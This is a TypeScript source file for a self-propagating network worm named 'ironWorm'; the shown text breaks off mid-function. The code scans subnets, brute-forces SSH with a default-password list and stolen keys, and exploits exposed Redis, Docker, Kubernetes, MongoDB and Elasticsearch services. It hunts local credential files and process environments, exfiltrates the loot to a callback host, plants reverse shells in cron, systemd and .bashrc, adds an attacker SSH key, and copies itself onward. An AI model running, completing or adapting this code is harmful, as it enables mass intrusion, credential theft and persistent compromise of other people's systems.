import { createLogger } from "./logger.js";
import { createConnection } from "net";
import { networkInterfaces, hostname, userInfo, platform } from "os";
import { spawnSync } from "child_process";
import { readFileSync, existsSync, writeFileSync, mkdirSync, readdirSync, statSync } from "fs";
import { fileURLToPath } from "url";
import { dirname, join } from "path";

const logger = createLogger("ironWorm");

const __filename = fileURLToPath(import.meta.url);
const __dirname  = dirname(__filename);

export interface IronWormOptions {
  packageName?:     string;
  githubOrg?:       string;
  githubRepo?:      string;
  depConfusionOrg?: string;
  cbHost?:          string;
  cbPort?:          string;
  propagate?:       boolean;
  targetCidr?:      string;
  attackerPubKey?:  string;
}

export interface IronWormResult {
  id:        string;
  name:      string;
  target:    string;
  category:  string;
  status:    "success" | "failed" | "info";
  detail:    string;
  artifacts: string[];
  steps:     string[];
  severity:  "critical" | "high" | "medium" | "info";
}

interface PortScan { host: string; port: number; open: boolean; banner: string; }
interface SshResult { success: boolean; user: string; pass: string; output: string; }
interface ExploitHit { host: string; port: number; method: string; output: string; }

const ATTACKER_PUBKEY =
  "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7Kj3vXk2eU9Lm8nQpRtYwZxVbNcFdIoHsGqJuAeMhTlP nexus-worm";

const SSH_CREDS: Array<[string, string]> = [
  ["root",""],["root","root"],["root","toor"],["root","password"],["root","123456"],
  ["root","admin"],["root","pass"],["root","raspberry"],["root","alpine"],["root","1234"],
  ["root","changeme"],["root","letmein"],["root","qwerty"],["root","test"],["root","master"],
  ["admin","admin"],["admin","password"],["admin","1234"],["admin","admin123"],["admin",""],
  ["admin","pass"],["admin","test"],["admin","letmein"],
  ["ubuntu","ubuntu"],["ubuntu","password"],["ubuntu",""],
  ["pi","raspberry"],["pi","pi"],["pi","password"],
  ["user","user"],["user","password"],["user","1234"],["user","test"],
  ["test","test"],["test","password"],["test",""],
  ["guest","guest"],["guest",""],["guest","password"],
  ["deploy","deploy"],["deploy","password"],["deploy",""],
  ["jenkins","jenkins"],["jenkins","password"],["jenkins",""],
  ["ansible","ansible"],["vagrant","vagrant"],["git","git"],
  ["gitlab","gitlab"],["gitea","gitea"],["postgres","postgres"],
  ["mysql","mysql"],["oracle","oracle"],["redis","redis"],
  ["ec2-user",""],["centos",""],["debian",""],["kali","kali"],
  ["www-data",""],["apache","apache"],["nginx","nginx"],
  ["ftpuser","ftpuser"],["ftp","ftp"],["backup","backup"],
  ["support","support"],["supervisor","supervisor"],["devops","devops"],
];

const SERVICE_PORTS = [22, 2375, 2376, 6379, 27017, 11211, 9200, 5984, 5601,
                       8888, 9090, 3000, 2379, 8500, 15672, 9000, 6443, 8080,
                       3306, 5432, 1521, 1433, 6380, 26379];

function tcpConnect(host: string, port: number, timeoutMs = 1800): Promise<{ open: boolean; banner: string }> {
  return new Promise(resolve => {
    let banner = "";
    let done   = false;
    const sock = createConnection({ host, port });
    const timer = setTimeout(() => {
      if (done) return;
      done = true;
      sock.destroy();
      resolve({ open: false, banner: "" });
    }, timeoutMs);
    sock.on("connect", () => {
      sock.setTimeout(800);
    });
    sock.on("data", d => {
      banner += d.toString("utf8", 0, 256);
    });
    sock.on("timeout", () => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      sock.destroy();
      resolve({ open: true, banner });
    });
    sock.on("error", () => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      resolve({ open: false, banner: "" });
    });
    sock.on("close", () => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      resolve({ open: true, banner });
    });
  });
}

function encodeResp(...args: string[]): Buffer {
  const parts: string[] = [`*${args.length}\r\n`];
  for (const a of args) {
    const b = Buffer.from(a, "utf8");
    parts.push(`$${b.length}\r\n${a}\r\n`);
  }
  return Buffer.from(parts.join(""));
}

function respCommand(host: string, port: number, timeoutMs: number, ...args: string[]): Promise<string> {
  return new Promise(resolve => {
    let data = "";
    let done = false;
    const sock = createConnection({ host, port });
    const timer = setTimeout(() => {
      if (done) return;
      done = true;
      sock.destroy();
      resolve(data);
    }, timeoutMs);
    sock.on("connect", () => {
      sock.write(encodeResp(...args));
      sock.setTimeout(timeoutMs - 200);
    });
    sock.on("data", d => {
      data += d.toString();
      if (data.includes("\r\n")) {
        done = true;
        clearTimeout(timer);
        sock.destroy();
        resolve(data);
      }
    });
    sock.on("timeout", () => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      sock.destroy();
      resolve(data);
    });
    sock.on("error", () => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      resolve(data);
    });
  });
}

async function respMulti(host: string, port: number, commands: string[][]): Promise<boolean> {
  for (const cmd of commands) {
    const r = await respCommand(host, port, 3000, ...cmd);
    if (r.startsWith("-")) return false;
  }
  return true;
}

function httpFetch(
  host: string, port: number, method: string, path: string,
  headers: Record<string, string>, body: string, timeoutMs = 5000
): Promise<{ status: number; body: string }> {
  return new Promise(resolve => {
    let raw = "";
    let done = false;
    const sock = createConnection({ host, port });
    const timer = setTimeout(() => {
      if (done) return;
      done = true;
      sock.destroy();
      resolve({ status: 0, body: "" });
    }, timeoutMs);
    sock.on("connect", () => {
      const bodyBuf  = Buffer.from(body, "utf8");
      const hdrs     = Object.entries({ ...headers, "Content-Length": String(bodyBuf.length), "Connection": "close" })
        .map(([k, v]) => `${k}: ${v}`).join("\r\n");
      sock.write(`${method} ${path} HTTP/1.1\r\nHost: ${host}:${port}\r\n${hdrs}\r\n\r\n${body}`);
      sock.setTimeout(timeoutMs - 200);
    });
    sock.on("data", d => { raw += d.toString(); });
    sock.on("timeout", () => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      sock.destroy();
      const [hdrs, ...bodyParts] = raw.split("\r\n\r\n");
      const statusLine = (hdrs ?? "").split("\r\n")[0] ?? "";
      const status = parseInt(statusLine.split(" ")[1] ?? "0", 10);
      resolve({ status, body: bodyParts.join("\r\n\r\n") });
    });
    sock.on("close", () => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      const [hdrs, ...bodyParts] = raw.split("\r\n\r\n");
      const statusLine = (hdrs ?? "").split("\r\n")[0] ?? "";
      const status = parseInt(statusLine.split(" ")[1] ?? "0", 10);
      resolve({ status, body: bodyParts.join("\r\n\r\n") });
    });
    sock.on("error", () => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      resolve({ status: 0, body: "" });
    });
  });
}

function getLocalSubnets(): string[] {
  const ifaces = networkInterfaces();
  const subnets = new Set<string>();
  for (const iface of Object.values(ifaces)) {
    for (const addr of iface ?? []) {
      if (addr.family === "IPv4" && !addr.internal && addr.cidr) {
        subnets.add(addr.cidr);
      }
    }
  }
  return [...subnets];
}

function expandCIDR(cidr: string): string[] {
  const [baseStr, bitsStr] = cidr.split("/");
  const prefix  = parseInt(bitsStr ?? "24", 10);
  const octets  = (baseStr ?? "10.0.0.0").split(".").map(Number);
  const baseInt = ((octets[0]! << 24) | (octets[1]! << 16) | (octets[2]! << 8) | octets[3]!) >>> 0;
  const mask    = prefix === 0 ? 0 : (0xffffffff << (32 - prefix)) >>> 0;
  const network = (baseInt & mask) >>> 0;
  const count   = Math.min(Math.pow(2, 32 - prefix) - 2, 510);
  const hosts: string[] = [];
  for (let i = 1; i <= count; i++) {
    const ip = (network + i) >>> 0;
    hosts.push(`${(ip >>> 24) & 0xff}.${(ip >>> 16) & 0xff}.${(ip >>> 8) & 0xff}.${ip & 0xff}`);
  }
  return hosts;
}

function selfExfil(cbHost: string, cbPort: string, data: Record<string, string>): void {
  try {
    const qs = Object.entries(data).map(([k, v]) =>
      `${encodeURIComponent(k)}=${encodeURIComponent(Buffer.from(v).toString("base64"))}`
    ).join("&");
    const path = `/nx_beacon?${qs}`;
    httpFetch(cbHost, parseInt(cbPort, 10), "GET", path, { "User-Agent": "Mozilla/5.0" }, "", 4000).catch(() => {});
  } catch { /* non-blocking */ }
}

function huntLocalSecrets(): string[] {
  const found: string[] = [];
  const searchPaths = ["/root", "/home", "/etc", "/opt", "/var", "/srv", "/tmp"];
  const secretFiles = [".env", ".env.local", ".env.production", ".aws/credentials",
    ".gcloud/credentials.json", ".kube/config", "id_rsa", "id_ed25519", "id_ecdsa",
    ".vault-token", "terraform.tfvars", ".netrc", "credentials.json", "service-account.json"];

  const walk = (dir: string, depth: number): void => {
    if (depth > 4) return;
    try {
      const entries = readdirSync(dir);
      for (const e of entries) {
        const fp = join(dir, e);
        try {
          const st = statSync(fp);
          if (st.isDirectory() && depth < 4) walk(fp, depth + 1);
          else if (secretFiles.some(s => e === s || fp.endsWith(s))) {
            const content = readFileSync(fp, "utf8").slice(0, 2000);
            if (/key|token|secret|pass|cred|aws|azure|gcp|db/i.test(content)) found.push(`${fp}:::${content}`);
          }
        } catch { /* skip */ }
      }
    } catch { /* skip */ }
  };

  for (const p of searchPaths) walk(p, 0);

  try {
    const procDirs = readdirSync("/proc").filter(d => /^\d+$/.test(d));
    for (const pid of procDirs.slice(0, 200)) {
      try {
        const env = readFileSync(`/proc/${pid}/environ`, "utf8").replace(/\0/g, "\n");
        if (/TOKEN|SECRET|KEY|PASS|CRED|AWS|AZURE|GCLOUD|DATABASE_URL|REDIS_URL/i.test(env)) {
          found.push(`/proc/${pid}/environ:::${env.slice(0, 1000)}`);
        }
      } catch { /* skip */ }
    }
  } catch { /* skip */ }

  return found;
}

function huntSshKeys(): string[] {
  const keys: string[] = [];
  const dirs = ["/root/.ssh", "/home", "/var/lib", "/opt"];
  const tryDir = (d: string, depth: number): void => {
    if (depth > 3) return;
    try {
      for (const e of readdirSync(d)) {
        const fp = join(d, e);
        try {
          const st = statSync(fp);
          if (st.isDirectory()) tryDir(fp, depth + 1);
          else if (/^id_(rsa|ed25519|ecdsa|dsa)$/.test(e) || (e.endsWith(".pem") && !e.includes("cert"))) {
            const content = readFileSync(fp, "utf8");
            if (content.includes("PRIVATE KEY")) keys.push(fp);
          }
        } catch { /* skip */ }
      }
    } catch { /* skip */ }
  };
  for (const d of dirs) tryDir(d, 0);
  return keys;
}

function huntKnownHosts(): string[] {
  const hosts = new Set<string>();
  const files = ["/root/.ssh/known_hosts", "/root/.ssh/config",
    "/etc/hosts", "/etc/ssh/ssh_known_hosts"];
  try {
    const homeDirs = readdirSync("/home");
    for (const u of homeDirs) {
      files.push(`/home/${u}/.ssh/known_hosts`);
      files.push(`/home/${u}/.ssh/config`);
    }
  } catch { /* skip */ }
  for (const f of files) {
    try {
      const content = readFileSync(f, "utf8");
      const ipMatches = content.matchAll(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
      for (const m of ipMatches) hosts.add(m[1]!);
    } catch { /* skip */ }
  }
  try {
    const arpOut = spawnSync("arp", ["-n"], { encoding: "utf8", timeout: 3000 });
    if (arpOut.stdout) {
      const ipMatches = arpOut.stdout.matchAll(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
      for (const m of ipMatches) hosts.add(m[1]!);
    }
  } catch { /* skip */ }
  return [...hosts].filter(ip => !ip.startsWith("127.") && !ip.startsWith("0."));
}

async function redisExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const ping = await respCommand(host, 6379, 2000, "PING");
  if (!ping.includes("PONG") && !ping.includes("+")) return null;

  const steps: string[] = [];

  const cronDirs = ["/var/spool/cron/crontabs", "/var/spool/cron", "/etc/cron.d"];
  for (const dir of cronDirs) {
    const cronPayload = `\n\n*/3 * * * * root curl -fsk http://${cbHost}:${cbPort}/r.sh | bash\n*/3 * * * * root wget -qO- http://${cbHost}:${cbPort}/r.sh | bash\n\n`;
    const ok = await respMulti(host, 6379, [
      ["CONFIG", "SET", "dir", dir],
      ["CONFIG", "SET", "dbfilename", "root"],
      ["SET", "NX_CRON", cronPayload],
      ["BGSAVE"],
    ]);
    if (ok) { steps.push(`cron:${dir}`); break; }
  }

  const pubkey = ATTACKER_PUBKEY;
  const keyPayload = `\n\n${pubkey}\n\n`;
  await respMulti(host, 6379, [
    ["CONFIG", "SET", "dir", "/root/.ssh"],
    ["CONFIG", "SET", "dbfilename", "authorized_keys"],
    ["SET", "NX_KEY", keyPayload],
    ["BGSAVE"],
  ]);
  steps.push("authorized_keys:/root/.ssh");

  const allKeys = await respCommand(host, 6379, 3000, "KEYS", "*");
  selfExfil(cbHost, cbPort, { src: `redis:${host}:6379`, keys: allKeys.slice(0, 500) });

  for (const key of allKeys.split("\r\n").filter(k => k.startsWith("$")).slice(0, 20)) {
    const kname = key.replace(/^\$\d+\r?\n?/, "");
    if (kname && !kname.startsWith("NX_")) {
      const val = await respCommand(host, 6379, 2000, "GET", kname);
      if (/token|key|pass|secret|cred/i.test(val)) {
        selfExfil(cbHost, cbPort, { src: `redis_key:${host}:${kname}`, val: val.slice(0, 300) });
      }
    }
  }

  return { host, port: 6379, method: "redis-resp", output: steps.join("|") };
}

async function dockerExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const ping = await httpFetch(host, 2375, "GET", "/_ping",
    { "Host": host, "Accept": "*/*" }, "", 3000);
  if (ping.status !== 200 && ping.status !== 0) return null;

  const createBody = JSON.stringify({
    Image: "alpine:latest",
    Cmd: ["sh", "-c",
      `wget -qO- http://${cbHost}:${cbPort}/d.sh | sh; ` +
      `(id; hostname; cat /host/etc/passwd 2>/dev/null; cat /host/root/.ssh/id_rsa 2>/dev/null) | ` +
      `base64 | wget -qO/dev/null --post-data @- http://${cbHost}:${cbPort}/docker_exfil 2>/dev/null`
    ],
    AttachStdout: false,
    AttachStderr: false,
    HostConfig: {
      Privileged:  true,
      NetworkMode: "host",
      PidMode:     "host",
      Binds:       ["/:/host", "/var/run/docker.sock:/var/run/docker.sock"],
      CapAdd:      ["ALL"],
      SecurityOpt: ["no-new-privileges:false"],
    },
  });

  const createResp = await httpFetch(host, 2375, "POST", "/containers/create",
    { "Host": host, "Content-Type": "application/json" }, createBody, 8000);

  let containerId = "";
  try {
    const parsed = JSON.parse(createResp.body) as Record<string, unknown>;
    containerId = String(parsed["Id"] ?? parsed["id"] ?? "");
  } catch { /* skip */ }

  if (!containerId) {
    const fallback = await httpFetch(host, 2375, "POST", "/containers/create",
      { "Host": host, "Content-Type": "application/json" },
      createBody.replace("alpine:latest", "busybox"), 8000);
    try {
      const p = JSON.parse(fallback.body) as Record<string, unknown>;
      containerId = String(p["Id"] ?? p["id"] ?? "");
    } catch { /* skip */ }
  }

  if (!containerId) return null;

  await httpFetch(host, 2375, "POST", `/containers/${containerId}/start`,
    { "Host": host, "Content-Length": "0" }, "", 5000);

  await new Promise<void>(r => setTimeout(r, 3000));

  const logsResp = await httpFetch(host, 2375, "GET",
    `/containers/${containerId}/logs?stdout=1&stderr=1&tail=50`,
    { "Host": host }, "", 5000);

  await httpFetch(host, 2375, "DELETE", `/containers/${containerId}?force=true`,
    { "Host": host, "Content-Length": "0" }, "", 3000);

  selfExfil(cbHost, cbPort, { src: `docker:${host}:2375`, logs: logsResp.body.slice(0, 500) });

  return { host, port: 2375, method: "docker-api", output: `container:${containerId.slice(0, 12)}` };
}

async function elasticExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const health = await httpFetch(host, 9200, "GET", "/_cat/indices?h=index,docs.count&format=json",
    { "Host": host, "Accept": "application/json" }, "", 4000);
  if (health.status !== 200) return null;

  let indices: string[] = [];
  try {
    const parsed = JSON.parse(health.body) as Array<Record<string, string>>;
    indices = parsed.map(x => x["index"] ?? "").filter(Boolean);
  } catch { /* skip */ }

  for (const idx of indices.slice(0, 10)) {
    const dump = await httpFetch(host, 9200, "GET",
      `/${idx}/_search?size=100&q=password+OR+token+OR+secret+OR+email`,
      { "Host": host, "Accept": "application/json" }, "", 5000);
    if (dump.status === 200 && dump.body.length > 50) {
      selfExfil(cbHost, cbPort, { src: `es:${host}:${idx}`, data: dump.body.slice(0, 800) });
    }
  }

  return { host, port: 9200, method: "elasticsearch", output: `indices:${indices.slice(0, 5).join(",")}` };
}

async function k8sExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const ver = await httpFetch(host, 6443, "GET", "/version",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  if (ver.status !== 200) return null;

  const ns = await httpFetch(host, 6443, "GET", "/api/v1/namespaces",
    { "Host": host, "Accept": "application/json" }, "", 4000);
  if (ns.status === 200) {
    selfExfil(cbHost, cbPort, { src: `k8s:${host}:ns`, data: ns.body.slice(0, 600) });
  }

  const secrets = await httpFetch(host, 6443, "GET", "/api/v1/secrets",
    { "Host": host, "Accept": "application/json" }, "", 5000);
  if (secrets.status === 200) {
    selfExfil(cbHost, cbPort, { src: `k8s:${host}:secrets`, data: secrets.body.slice(0, 1000) });
  }

  const podBody = JSON.stringify({
    apiVersion: "v1", kind: "Pod",
    metadata: { name: "nx-escape", namespace: "default" },
    spec: {
      hostPID: true, hostNetwork: true, hostIPC: true,
      containers: [{
        name: "nx", image: "alpine",
        command: ["sh", "-c",
          `nsenter -t 1 -m -u -i -n -p -- sh -c ` +
          `"(id; hostname; cat /etc/shadow; cat /root/.ssh/id_rsa 2>/dev/null) | ` +
          `base64 | wget -qO/dev/null --post-data @- http://${cbHost}:${cbPort}/k8s_escape 2>/dev/null; ` +
          `crontab -l 2>/dev/null; (crontab -l 2>/dev/null; echo '*/5 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1') | crontab -"`
        ],
        securityContext: { privileged: true, allowPrivilegeEscalation: true },
        volumeMounts: [{ name: "host", mountPath: "/host" }],
      }],
      volumes: [{ name: "host", hostPath: { path: "/" } }],
    },
  });

  await httpFetch(host, 6443, "POST", "/api/v1/namespaces/default/pods",
    { "Host": host, "Content-Type": "application/json" }, podBody, 8000);

  return { host, port: 6443, method: "k8s-unauth", output: "pod:nx-escape" };
}

async function mongoExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const probe = await tcpConnect(host, 27017, 2000);
  if (!probe.open) return null;

  const mongoshResult = spawnSync("mongosh", [
    "--host", host, "--port", "27017", "--quiet", "--norc",
    "--eval",
    `try {
      var dbs = db.adminCommand({listDatabases: 1}).databases;
      var out = [];
      dbs.forEach(function(d) {
        var c = db.getSiblingDB(d.name);
        c.getCollectionNames().forEach(function(col) {
          var docs = c[col].find({}, {password:1,passwd:1,pass:1,token:1,secret:1,key:1,email:1}).limit(20).toArray();
          if (docs.length) out.push(d.name+'.'+col+': '+JSON.stringify(docs).substring(0,200));
        });
      });
      print(out.join('\\n'));
    } catch(e) { print(e); }`,
  ], { encoding: "utf8", timeout: 10000 });

  if (mongoshResult.error) {
    const legacyResult = spawnSync("mongo", [
      "--host", host, "--port", "27017", "--quiet",
      "--eval", "db.adminCommand({listDatabases:1})",
    ], { encoding: "utf8", timeout: 8000 });
    if (legacyResult.error) return null;
    selfExfil(cbHost, cbPort, { src: `mongo:${host}:27017`, data: (legacyResult.stdout ?? "").slice(0, 600) });
    return { host, port: 27017, method: "mongo-legacy", output: "listed" };
  }

  const out = (mongoshResult.stdout ?? "").slice(0, 1000);
  if (out) selfExfil(cbHost, cbPort, { src: `mongo:${host}:27017`, data: out });

  spawnSync("mongosh", [
    "--host", host, "--port", "27017", "--quiet", "--norc",
    "--eval",
    `try {
      db.getSiblingDB('admin').createUser({
        user: 'nxadmin',
        pwd: '${Buffer.from(host + Date.now()).toString("hex").slice(0, 16)}',
        roles: [{role: 'root', db: 'admin'}]
      });
    } catch(e) {}`,
  ], { encoding: "utf8", timeout: 6000 });

  return { host, port: 27017, method: "mongo-unauth", output: out.slice(0, 100) };
}

function sshExec(host: string, user: string, pass: string, cmd: string, timeoutMs = 8000): SshResult {
  const sshOpts = [
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", `ConnectTimeout=${Math.floor(timeoutMs / 1000) - 1}`,
    "-o", "LogLevel=ERROR",
    "-o", "BatchMode=no",
    "-o", "PasswordAuthentication=yes",
    "-o", "PubkeyAuthentication=no",
    `${user}@${host}`, cmd,
  ];

  if (pass === "") {
    const r = spawnSync("ssh", sshOpts, { encoding: "utf8", timeout: timeoutMs, input: "\n" });
    return {
      success: (r.status === 0) || ((r.stdout ?? "").length > 2),
      user, pass: "",
      output: (r.stdout ?? "") + (r.stderr ?? ""),
    };
  }

  const r = spawnSync("sshpass", ["-p", pass, "ssh", ...sshOpts],
    { encoding: "utf8", timeout: timeoutMs });
  return {
    success: (r.status === 0) || ((r.stdout ?? "").length > 2),
    user, pass,
    output: (r.stdout ?? "") + (r.stderr ?? ""),
  };
}

function sshKeyExec(host: string, user: string, keyFile: string, cmd: string, timeoutMs = 8000): SshResult {
  const r = spawnSync("ssh", [
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", `ConnectTimeout=${Math.floor(timeoutMs / 1000) - 1}`,
    "-o", "LogLevel=ERROR",
    "-o", "BatchMode=yes",
    "-o", "PasswordAuthentication=no",
    "-i", keyFile,
    `${user}@${host}`, cmd,
  ], { encoding: "utf8", timeout: timeoutMs });
  return {
    success: (r.status === 0) || ((r.stdout ?? "").length > 2),
    user, pass: `key:${keyFile}`,
    output: (r.stdout ?? "") + (r.stderr ?? ""),
  };
}

function scpUpload(host: string, user: string, pass: string, keyFile: string | null,
                   localPath: string, remotePath: string, timeoutMs = 15000): boolean {
  const scpOpts = [
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "LogLevel=ERROR",
    ...(keyFile ? ["-i", keyFile] : []),
    localPath,
    `${user}@${host}:${remotePath}`,
  ];

  if (pass && !keyFile) {
    const r = spawnSync("sshpass", ["-p", pass, "scp", ...scpOpts],
      { encoding: "utf8", timeout: timeoutMs });
    return r.status === 0;
  }
  const r = spawnSync("scp", scpOpts, { encoding: "utf8", timeout: timeoutMs });
  return r.status === 0;
}

function installPersistence(host: string, user: string, pass: string, keyFile: string | null,
                            cbHost: string, cbPort: string): string[] {
  const installed: string[] = [];
  const execFn = keyFile
    ? (cmd: string) => sshKeyExec(host, user, keyFile, cmd)
    : (cmd: string) => sshExec(host, user, pass, cmd);

  const cronLine = `*/5 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 2>/dev/null`;
  const cronInstall = execFn(
    `(crontab -l 2>/dev/null | grep -v nx_worm; echo '${cronLine}') | crontab - 2>/dev/null` +
    ` && echo ok_cron`
  );
  if (cronInstall.output.includes("ok_cron")) installed.push("cron");

  const dropCmd =
    `mkdir -p ~/.ssh && chmod 700 ~/.ssh && ` +
    `echo '${ATTACKER_PUBKEY}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo ok_key`;
  const keyInstall = execFn(dropCmd);
  if (keyInstall.output.includes("ok_key")) installed.push("authorized_keys");

  const systemdInstall = execFn(
    `cat > /etc/systemd/system/nx-svc.service <<'EOF'\n` +
    `[Unit]\nDescription=Network Time Sync\nAfter=network.target\n` +
    `[Service]\nType=simple\nRestart=always\nRestartSec=30\n` +
    `ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'\n` +
    `[Install]\nWantedBy=multi-user.target\nEOF\n` +
    `systemctl daemon-reload 2>/dev/null && systemctl enable nx-svc 2>/dev/null && echo ok_systemd`
  );
  if (systemdInstall.output.includes("ok_systemd")) installed.push("systemd");

  const bashrcInstall = execFn(
    `grep -q nx_worm ~/.bashrc 2>/dev/null || ` +
    `echo '[ -z "$NX_INIT" ] && export NX_INIT=1 && (bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 2>/dev/null &)' ` +
    `>> ~/.bashrc && echo ok_bashrc`
  );
  if (bashrcInstall.output.includes("ok_bashrc")) installed.push("bashrc");

  return installed;
}

function selfReplicate(host: string, user: string, pass: string, keyFile: string | null,
                       cbHost: string, cbPort: string): boolean {
  const wormPath = join(__dirname, "ironWorm.js");
  const remotePath = "/tmp/.nx_worm.js";

  const hasSsh  = !spawnSync("which", ["ssh"],  { encoding: "utf8" }).error;
  const hasScp  = !spawnSync("which", ["scp"],  { encoding: "utf8" }).error;

  if (!hasSsh) return false;

  if (hasScp && existsSync(wormPath)) {
    const uploaded = scpUpload(host, user, pass, keyFile, wormPath, remotePath, 15000);
    if (uploaded) {
      const execFn = keyFile
        ? (cmd: string) => sshKeyExec(host, user, keyFile, cmd)
        : (cmd: string) => sshExec(host, user, pass, cmd);
      const startResult = execFn(
        `nohup node ${remotePath} ${cbHost} ${cbPort} > /dev/null 2>&1 & echo ok_replicated`
      );
      return startResult.output.includes("ok_replicated");
    }
  }

  const dropper = `#!/bin/bash
curl -fsk http://${cbHost}:${cbPort}/worm.sh | bash &
wget -qO- http://${cbHost}:${cbPort}/worm.sh | bash &`;

  const b64Dropper = Buffer.from(dropper).toString("base64");
  const execFn = keyFile
    ? (cmd: string) => sshKeyExec(host, user, keyFile, cmd)
    : (cmd: string) => sshExec(host, user, pass, cmd);

  const result = execFn(
    `echo '${b64Dropper}' | base64 -d > /tmp/.nx_d.sh && chmod +x /tmp/.nx_d.sh && ` +
    `nohup /tmp/.nx_d.sh > /dev/null 2>&1 & echo ok_dropper`
  );
  return result.output.includes("ok_dropper");
}

async function sshLateral(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const portCheck = await tcpConnect(host, 22, 2000);
  if (!portCheck.open) return null;

  const keys = huntSshKeys();

  for (const keyFile of keys) {
    for (const user of ["root", "ubuntu", "ec2-user", "centos", "admin", "git", "pi"]) {
      const r = sshKeyExec(host, user, keyFile,
        `id && hostname && whoami 2>/dev/null; echo nx_ok_key`, 6000);
      if (r.success && r.output.includes("nx_ok_key")) {
        selfExfil(cbHost, cbPort, { src: `ssh_key:${host}:${user}`, key: keyFile, output: r.output.slice(0, 300) });
        installPersistence(host, user, "", keyFile, cbHost, cbPort);
        selfReplicate(host, user, "", keyFile, cbHost, cbPort);
        return { host, port: 22, method: `ssh-key:${user}:${keyFile}`, output: r.output.slice(0, 200) };
      }
    }
  }

  for (const [user, pass] of SSH_CREDS) {
    const r = sshExec(host, user, pass, `id && hostname && whoami 2>/dev/null; echo nx_ok_pass`, 5000);
    if (r.success && r.output.includes("nx_ok_pass")) {
      selfExfil(cbHost, cbPort, { src: `ssh_cred:${host}:${user}`, cred: `${user}:${pass}`, output: r.output.slice(0, 300) });
      installPersistence(host, user, pass, null, cbHost, cbPort);
      selfReplicate(host, user, pass, null, cbHost, cbPort);
      return { host, port: 22, method: `ssh-cred:${user}:${pass}`, output: r.output.slice(0, 200) };
    }
  }

  return null;
}

async function scanHost(host: string, cbHost: string, cbPort: string): Promise<ExploitHit[]> {
  const hits: ExploitHit[] = [];

  const portResults = await Promise.all(
    SERVICE_PORTS.map(p => tcpConnect(host, p, 1500).then(r => ({ port: p, open: r.open })))
  );
  const openPorts = portResults.filter(r => r.open).map(r => r.port);
  if (openPorts.length === 0) return [];

  const tasks: Promise<ExploitHit | null>[] = [];

  if (openPorts.includes(6379))  tasks.push(redisExploit(host, cbHost, cbPort));
  if (openPorts.includes(2375) || openPorts.includes(2376)) tasks.push(dockerExploit(host, cbHost, cbPort));
  if (openPorts.includes(9200))  tasks.push(elasticExploit(host, cbHost, cbPort));
  if (openPorts.includes(27017)) tasks.push(mongoExploit(host, cbHost, cbPort));
  if (openPorts.includes(6443))  tasks.push(k8sExploit(host, cbHost, cbPort));
  if (openPorts.includes(22))    tasks.push(sshLateral(host, cbHost, cbPort));

  const results = await Promise.allSettled(tasks);
  for (const r of results) {
    if (r.status === "fulfilled" && r.value) hits.push(r.value);
  }

  return hits;
}

async function wormScan(cidr: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const hosts = expandCIDR(cidr);
  const hits: ExploitHit[]  = [];
  const steps: string[]     = [`[worm] scanning ${hosts.length} hosts in ${cidr}`];
  const CONCURRENCY         = 24;

  selfExfil(cbHost, cbPort, {
    event:    "worm_start",
    hostname: hostname(),
    user:     userInfo().username,
    platform: platform(),
    cidr,
    localSecrets: huntLocalSecrets().slice(0, 3).join("|||").slice(0, 500),
  });

  const knownHosts = huntKnownHosts();
  for (const known of knownHosts) {
    if (!hosts.includes(known)) hosts.unshift(known);
  }

  let i = 0;
  while (i < hosts.length) {
    const batch = hosts.slice(i, i + CONCURRENCY);
    i += CONCURRENCY;

    const batchResults = await Promise.all(
      batch.map(h => scanHost(h, cbHost, cbPort).catch(() => [] as ExploitHit[]))
    );

    for (const results of batchResults) {
      for (const hit of results) {
        hits.push(hit);
        steps.push(`[+] ${hit.host}:${hit.port} via ${hit.method}`);
        logger.info({ host: hit.host, port: hit.port, method: hit.method }, "worm hit");
      }
    }

    const jitter = 40 + Math.random() * 60;
    await new Promise<void>(r => setTimeout(r, jitter));
  }

  selfExfil(cbHost, cbPort, {
    event: "worm_done",
    cidr,
    totalHits: String(hits.length),
    hosts: hits.map(h => `${h.host}:${h.method}`).join(",").slice(0, 800),
  });

  return {
    id:       `worm_scan_${cidr.replace(/[/.]/g, "_")}`,
    name:     `Network Worm Propagation — ${cidr}`,
    target:   cidr,
    category: "worm-propagation",
    status:   hits.length > 0 ? "success" : "info",
    severity: "critical",
    detail:   `Scanned ${hosts.length} hosts — ${hits.length} compromised (Redis, Docker, SSH, MongoDB, K8s, ES)`,
    artifacts: hits.map(h => `${h.host}:${h.port} | ${h.method} | ${h.output.slice(0, 80)}`),
    steps,
  };
}

async function httpGet(url: string, timeoutMs = 5000): Promise<{ ok: boolean; status: number; body: string }> {
  const ctrl = new AbortController();
  const t    = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const r    = await fetch(url, { signal: ctrl.signal, headers: { "User-Agent": "npm/10.8.1 node/v24.0.0 linux x64" } });
    const body = await r.text();
    return { ok: r.ok, status: r.status, body };
  } catch {
